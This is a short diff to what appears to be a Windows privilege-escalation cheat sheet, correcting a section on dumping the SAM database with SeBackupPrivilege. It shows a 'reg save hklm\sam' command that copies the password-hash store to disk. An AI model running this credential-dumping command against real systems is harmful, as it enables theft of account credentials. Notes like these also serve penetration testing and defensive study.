@@ -809,7 +809,7 @@ i686-w64-mingw32-gcc hello.c -static -o hello
 
 # 28. SAM Dump with SeBackupPrivilege
 
-If a comprimised user has SeBackupPrivielege, the attacker can dump the SAM database used by the LSASS process.
+If a compromised user has SeBackupPrivilege and SeRestorePrivilege, the attacker can dump the SAM database used by the LSASS process.
 
 ```
 reg save hklm\sam C:\Users\<username>\Desktop\SAM.hive
